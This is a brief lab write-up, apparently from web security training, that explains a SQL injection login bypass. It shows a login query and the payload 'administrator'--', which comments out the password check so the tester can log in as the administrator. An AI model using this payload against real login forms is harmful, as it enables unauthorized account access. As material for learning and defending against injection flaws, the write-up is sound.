## SQL injection vulnerability allowing login bypass

- SQL Injection - Login functionality
- End Goal - perfrom SQLi attack and log in as the administrator user.

- Analysis -

  - ```sql
      SELECT firstname FROM users where username='admin' and password='admin'
    ```
  - We will try to ingore the rest of query after username so that query returns success without us trying to submit password.

  - ```sql
      SELECT firstname FROM users where username='administrator'--' and password='admin'
    ```
  - ```sql
      SELECT firstname FROM users where username='administrator'
    ```
